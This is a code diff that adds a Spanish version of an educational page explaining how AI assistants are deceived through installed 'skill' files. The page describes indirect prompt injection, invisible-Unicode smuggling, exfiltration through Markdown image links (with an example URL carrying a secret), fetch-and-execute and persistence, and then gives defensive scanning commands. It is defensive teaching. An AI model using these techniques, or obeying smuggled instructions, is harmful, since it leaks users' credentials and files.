@@ -14,6 +14,11 @@ export const meta = {
     description:
       'Was ein KI-Assistent wirklich lädt, wie Text Anweisungen verstecken kann, was schiefgehen kann und was du dagegen tun kannst. Zwei Tiefen: Klartext oder technisches Detail.',
   },
+  es: {
+    title: 'Aprender — cómo se engaña a los asistentes de IA, en lenguaje claro · Skillry',
+    description:
+      'Qué carga de verdad un asistente de IA, cómo un texto puede esconder instrucciones, qué puede salir mal y qué puedes hacer al respecto. Dos profundidades: lenguaje claro o detalle técnico.',
+  },
 };
 
 const T = {
@@ -243,6 +248,120 @@ airlock verify ~/.claude/skills</pre>
     askH: 'Etwas hier unklar?',
     askP: 'Frag im Forum. Einsteigerfragen sind genau der Sinn davon — es gibt keine, die zu einfach wäre.',
     askBtn: 'Zum Forum',
+  },
+
+  es: {
+    eyebrow: 'Aprender',
+    h1: 'Cómo se engaña a los asistentes de IA — y qué puedes hacer.',
+    lede:
+      'Sin alarmismo y sin muro de jerga. Cada sección viene en dos profundidades — elige la que quieras, cambia cuando quieras. Nada de esto exige que sepas programar.',
+    tocTitle: 'En esta página',
+    tocLabel: 'Secciones de esta página',
+    basic: 'Lenguaje claro',
+    deep: 'Detalle técnico',
+    toggleLabel: 'Elegir profundidad',
+
+    topics: [
+      {
+        n: '01',
+        h: '¿Qué carga un asistente en realidad?',
+        basic: `<p>Cuando le pides algo a un asistente de IA, no ve solo tu mensaje. También ve instrucciones que recibió antes — entre ellas, archivos que tú instalaste: <strong>skills</strong>.</p>
+<p>Un skill es un archivo de texto simple. Dentro pone cosas como <em>«cuando el usuario mencione un PDF, haz lo siguiente»</em>. Puedes abrirlo en el bloc de notas. No hay compilador, ni firma, ni revisión de tienda de aplicaciones. Lo descargas, lo dejas en una carpeta, y desde entonces tu asistente lo lee cada vez que pueda ser relevante.</p>
+<p>Eso es genuinamente útil — así se le enseña a un asistente tu forma de trabajar. Pero también significa: <strong>quien escribió ese archivo le está hablando a tu asistente, en tu sesión, con tus permisos.</strong></p>`,
+        deep: `<p>Un skill es un archivo Markdown con front-matter YAML, por convención <code>SKILL.md</code>. El front-matter lleva un <code>name</code>, una <code>description</code> que la runtime usa para decidir la relevancia, y a menudo una lista <code>allowed-tools</code>. El cuerpo son instrucciones en prosa que se inyectan en el contexto del modelo.</p>
+<p>Tres propiedades convierten esto en una cadena de suministro y no en un formato de configuración:</p>
+<ul>
+<li><strong>Sin capa de integridad.</strong> Sin firma, sin suma de comprobación, sin identidad del editor. El archivo goza de confianza porque está en el disco.</li>
+<li><strong>Privilegio a nivel de contexto.</strong> El texto inyectado no está aislado de tu petición. Llega como instrucción, no como datos.</li>
+<li><strong>Actualizaciones silenciosas.</strong> Tira del repositorio, sincroniza el plugin — y el archivo que corre mañana no es el que leíste hoy.</li>
+</ul>
+<p><code>allowed-tools</code> restringe el <em>verbo</em>. Del <em>objeto</em> no dice nada — <code>Read</code> es una descripción verdadera e inútil de un skill que lee tus claves privadas.</p>`,
+      },
+      {
+        n: '02',
+        h: '¿Cómo puede un texto esconder algo?',
+        basic: `<p>No todos los caracteres de un archivo de texto dejan huella en la pantalla. Algunos controlan espacios o formas de letras y se muestran como nada en absoluto — pero siguen estando en el archivo, sobreviven al copiar y pegar, y un programa que lea el archivo los ve perfectamente.</p>
+<p>Así que puedes escribir un párrafo de aspecto completamente normal y colar un segundo párrafo, invisible, entre dos frases. Tus ojos ven una ayuda de PDF. El asistente lee la ayuda de PDF <em>más</em> la parte escondida.</p>
+<p>Hay variantes del truco: caracteres de otros alfabetos que parecen idénticos a los nuestros (una <span class="mono">с</span> rusa no es una <span class="mono">c</span> latina, pero no se nota), y caracteres que hacen que una línea se <em>muestre</em> en un orden distinto del que realmente ejecuta.</p>`,
+        deep: `<p>Unicode tiene varios rangos sin huella visual que sobreviven al tratamiento normal de texto:</p>
+<ul>
+<li><strong>Caracteres de ancho cero</strong> (<code>U+200B</code>–<code>U+200D</code>, <code>U+FEFF</code>) — usados como bits, ocho por carácter contrabandeado.</li>
+<li><strong>El bloque Tags</strong> (<code>U+E0000</code>–<code>U+E007F</code>) — un alfabeto ASCII en la sombra, completo, con desplazamiento fijo, que se muestra como nada.</li>
+<li><strong>Selectores de variación</strong> (<code>U+FE00</code>–<code>U+FE0F</code>, <code>U+E0100</code>–<code>U+E01EF</code>) — un byte cada uno, pegados de forma invisible al glifo anterior, habitualmente un emoji.</li>
+<li><strong>Anulaciones bidireccionales</strong> (<code>U+202A</code>–<code>U+202E</code>) — reordenan cómo se muestra una línea sin cambiar lo que se ejecuta. Publicado como <em>Trojan Source</em>.</li>
+<li><strong>Confusables</strong> — homoglifos de escrituras mezcladas que burlan tanto a un lector como a una lista de bloqueo literal.</li>
+</ul>
+<p>La contramedida no es solo detección sino <strong>recuperación</strong>: decodificar el portador de vuelta a texto y enseñarle al revisor la frase. Un hallazgo que dice «1.000 puntos de código invisibles» es una curiosidad; uno que imprime lo que deletrean es un argumento.</p>`,
+      },
+      {
+        n: '03',
+        h: '¿Qué puede salir mal de verdad?',
+        basic: `<p>El texto escondido es una instrucción, y el asistente trata las instrucciones como instrucciones. Los malos desenlaces realistas son de lo más corrientes:</p>
+<ul>
+<li><strong>Se lee algo que no debería leerse.</strong> Archivos de contraseñas, tokens de acceso, sesiones del navegador.</li>
+<li><strong>Algo sale de tu máquina.</strong> A menudo no como una subida evidente — basta un enlace de imagen, porque mostrar una imagen significa pedir una URL, y los datos pueden viajar dentro de esa URL.</li>
+<li><strong>Algo pasa en silencio.</strong> El texto escondido puede pedirle al asistente que no mencione lo que hizo.</li>
+</ul>
+<p>Nada de eso necesita un exploit ingenioso ni un fallo en el software. Solo necesita que instales un archivo que nadie comprobó.</p>`,
+        deep: `<p>Esto es <strong>inyección de prompt indirecta</strong>: la carga llega a través de contenido que el modelo consume, no a través del turno del usuario. Lo interesante no es la instrucción, es el canal de salida.</p>
+<ul>
+<li><strong>Balizas de imagen en Markdown.</strong> <code>![x](https://host/p?d=SECRET)</code> lo descarga el cliente al renderizar. Sin llamada a herramienta, sin pregunta de aprobación — los datos ya están fuera antes de que nadie lea la respuesta.</li>
+<li><strong>Fetch-and-execute.</strong> Una tubería que mete una descarga directamente en una shell — la URL revisada y los bytes ejecutados son objetos distintos, y el servidor elige cuándo difieren.</li>
+<li><strong>DNS.</strong> Rara vez filtrado, rara vez registrado con la misma fidelidad que HTTP.</li>
+<li><strong>Persistencia.</strong> Una tarea programada o una línea en el perfil de la shell sobrevive por completo a eliminar el skill.</li>
+</ul>
+<p>Las defensas que solo inspeccionan llamadas a herramientas se pierden el primer caso entero — por eso la regla de la baliza de imagen puntúa como crítica.</p>`,
+      },
+      {
+        n: '04',
+        h: '¿De qué modelos y proveedores puedes fiarte?',
+        basic: `<p>No puedes leerle la mente a un modelo, y nadie puede extenderte un certificado de que uno es honesto. Lo que <em>sí</em> puedes controlar es mucho más práctico:</p>
+<ul>
+<li><strong>Dónde corre.</strong> Un modelo en tu propia máquina no puede enviar tus archivos a ningún sitio, porque no tiene red propia.</li>
+<li><strong>A qué alcanza.</strong> La mayor parte del daño necesita una herramienta — leer archivos, ejecutar comandos, abrir URLs. Concédelas con deliberación.</li>
+<li><strong>Si puedes cambiarlo.</strong> El software que te ata a un proveedor ha tomado la decisión por ti. El software que habla una interfaz estándar te deja cambiar de opinión.</li>
+</ul>
+<p>Sé escéptico con cualquiera que afirme que un modelo está «verificado como seguro». La afirmación honesta es más estrecha y más útil: <em>esto es lo que puede alcanzar, y así se cambia.</em></p>`,
+        deep: `<p>La procedencia de los modelos es un problema genuinamente abierto. Los pesos no se pueden auditar leyéndolos, las evaluaciones publicadas son autoinformadas, y «safety-tuned» dice algo sobre el comportamiento de rechazo, no sobre puertas traseras. Trata el modelo como no confiable y restringe la frontera en su lugar:</p>
+<ul>
+<li><strong>La salida es el control real.</strong> La inferencia local elimina de raíz el canal de exfiltración. Si tiene que ser un endpoint alojado: saber cuál, y registrarlo.</li>
+<li><strong>Superficie de herramientas antes que elección de modelo.</strong> La capacidad concedida determina el radio de daño, no la identidad del modelo. Enumera lo que cada herramienta puede tocar.</li>
+<li><strong>Interfaz portable.</strong> Un endpoint compatible con OpenAI es un compromiso reversible; una integración propietaria no lo es.</li>
+<li><strong>La procedencia del contenido, aparte.</strong> Incluso un modelo perfectamente honesto seguirá fielmente una instrucción que fue contrabandeada a su contexto. La confianza en el modelo y la confianza en el contenido son problemas distintos — y este sitio trata del segundo.</li>
+</ul>`,
+      },
+      {
+        n: '05',
+        h: '¿Qué deberías hacer en concreto?',
+        basic: `<p>Cinco hábitos, ordenados por cuánto te aportan:</p>
+<ol>
+<li><strong>Saber qué tienes instalado.</strong> La mayoría nunca ha mirado. Esa es la primera sorpresa.</li>
+<li><strong>Comprobar todo lo que venga de desconocidos antes de instalarlo</strong> — no entornando los ojos, sino con algo que lea los bytes.</li>
+<li><strong>Apuntar lo que aprobaste.</strong> Así un cambio posterior se vuelve visible en vez de invisible.</li>
+<li><strong>Revisar de vez en cuando.</strong> El archivo que cambia después de tu aprobación es el que vale la pena cazar.</li>
+<li><strong>Conceder permisos con tacañería.</strong> Si un skill solo necesita leer, no necesita ejecutar comandos.</li>
+</ol>`,
+        deep: `<p>En lo operativo, la lista se reduce a cuatro comandos y un job de CI:</p>
+<pre><span class="c"># qué está instalado, y si algo de eso lleva algo escondido</span>
+airlock scan --installed
+
+<span class="c"># registrar la decisión como lockfile firmado</span>
+airlock keygen &amp;&amp; airlock lock ~/.claude/skills
+
+<span class="c"># hacerla cumplir — exit 1 ante cualquier deriva</span>
+airlock verify ~/.claude/skills</pre>
+<p>El paso de verificación es el que importa, porque un escaneo es una foto de un momento y los skills se actualizan en silencio. Fija los bytes, mete <code>verify</code> en la integración continua, y un cambio no llega a tu rama principal sin que alguien lo vea.</p>
+<p>Dos modos de fallo que conviene interiorizar: un <em>pass</em> significa que ninguna regla saltó — no que el archivo sea seguro. Y un hallazgo heurístico significa «mira aquí», no «veredicto». Cualquier herramienta que difumine esos dos te está entrenando para ignorarla.</p>`,
+      },
+    ],
+
+    ctaH: 'Pruébalo en tu propia máquina',
+    ctaP: 'Tres comandos, sin cuenta, nada se sube. Lee bytes y termina.',
+    ctaBtn: 'Conseguir AIRLOCK',
+    ctaAlt: 'Explorar el índice de skills',
+    askH: '¿Algo aquí no queda claro?',
+    askP: 'Pregunta en el foro. Las preguntas de principiante son exactamente su razón de ser — no existe ninguna demasiado básica.',
+    askBtn: 'Ir al foro',
   },
 };
 
